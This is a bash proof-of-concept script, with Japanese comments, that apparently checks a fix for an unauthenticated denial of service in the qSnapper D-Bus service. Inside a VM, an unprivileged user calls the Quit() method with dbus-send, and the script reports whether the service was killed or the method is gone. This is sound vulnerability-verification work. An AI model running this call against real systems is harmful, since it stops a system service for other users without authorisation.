#!/bin/bash
# poc_quit_dos.sh - Issue #5b: Quit() 無認証DoS
#
# bob が dbus-send で Quit() を叩き、サービスを停止させられることを確認。
# 修正版 (P1-6) では Quit() D-Busメソッドが削除されており UnknownMethod。

set -u
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

assert_running_in_vm
assert_qsnapper_service

BOB="${BOB_USER:-bob}"

# サービス稼働中であることを再確認 (PID取得)
PID_BEFORE=$(pgrep -f "qSnapper.*--dbus-service" | head -1 || true)
log "qSnapper service PID before: $PID_BEFORE"

# bob が Quit() を呼ぶ
OUTPUT=$(sudo -u "$BOB" dbus-send --system --print-reply \
    --dest="$DBUS_SERVICE" "$DBUS_PATH" \
    "${DBUS_IFACE}.Quit" 2>&1 || true)
log "Quit() response: $OUTPUT"

sleep 1
PID_AFTER=$(pgrep -f "qSnapper.*--dbus-service" | head -1 || true)
log "qSnapper service PID after: $PID_AFTER"

if echo "$OUTPUT" | grep -qE "UnknownMethod"; then
    log "Quit() method is removed — good"
    report_result blocked
elif [[ "$PID_BEFORE" != "$PID_AFTER" || -z "$PID_AFTER" ]]; then
    log "Service was killed by unauthenticated Quit() — vulnerability reproduced"
    report_result reproduced
else
    log "Service survived despite Quit() being available — unusual"
    report_result blocked
fi
